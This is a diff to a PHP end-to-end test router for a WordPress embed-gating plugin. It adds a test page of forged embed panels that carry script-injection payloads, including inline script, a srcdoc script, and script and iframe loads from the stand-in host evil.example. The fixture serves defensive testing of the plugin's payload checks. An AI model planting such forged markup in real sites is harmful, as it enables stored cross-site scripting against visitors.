@@ -98,6 +98,33 @@ if ( '/page/poster-mismatch' === $uri ) {
 	return true;
 }
 
+if ( '/page/forged' === $uri || '/page/forged-memory' === $uri ) {
+	// What a Contributor can save: WordPress's kses keeps class and data-*
+	// on every tag and allows div and button, so the 0.x panel markup —
+	// payload in an attribute — was forgeable verbatim. Three forgeries,
+	// one per executable payload shape, next to one real embed so gate.js
+	// is on the page. None of them carries the one thing kses never lets
+	// through: the <script type="application/json"> payload element.
+	$forge = static function ( string $id, string $payload ): string {
+		return '<div class="cg-embed" role="group" aria-label="Forged ' . $id . '" data-cg-provider="youtube" data-cg-host="www.youtube-nocookie.com" data-cg-payload=\'' . $payload . '\' id="forged-' . $id . '">'
+			. '<div class="cg-embed__panel"><p class="cg-embed__note">Forged.</p><button type="button" class="cg-embed__button">Load forged ' . $id . '</button>'
+			. '<p class="cg-embed__fallback"><a href="https://www.youtube.com/watch?v=AbCdEfGhIjK" rel="noopener nofollow">Open</a></p></div></div>';
+	};
+	$content = implode(
+		"\n",
+		array(
+			'<iframe title="Real" width="500" height="281" src="https://www.youtube.com/embed/y_pjE_p1HwE" frameborder="0"></iframe>',
+			$forge( 'inline', '{"strategy":"script","inline":"window.__pwned = \\"inline\\";"}' ),
+			$forge( 'srcdoc', '{"srcdoc":"<script>parent.__pwned = \\"srcdoc\\";</script>","attrs":{}}' ),
+			$forge( 'script', '{"strategy":"script","src":"https://evil.example/x.js"}' ),
+			$forge( 'iframe', '{"src":"https://evil.example/frame","attrs":{"title":"forged"}}' ),
+		)
+	);
+
+	cg_e2e_page( $content, '', '/page/forged-memory' === $uri ? 'window.caluconEmbedGateConfig = { memory: "persistent", scope: "all" };' : '' );
+	return true;
+}
+
 if ( '/page/gated' === $uri ) {
 	// Raw content as WordPress would render it, before gating: one embed per
 	// authoring style from the fixture corpus, plus a same-origin iframe that
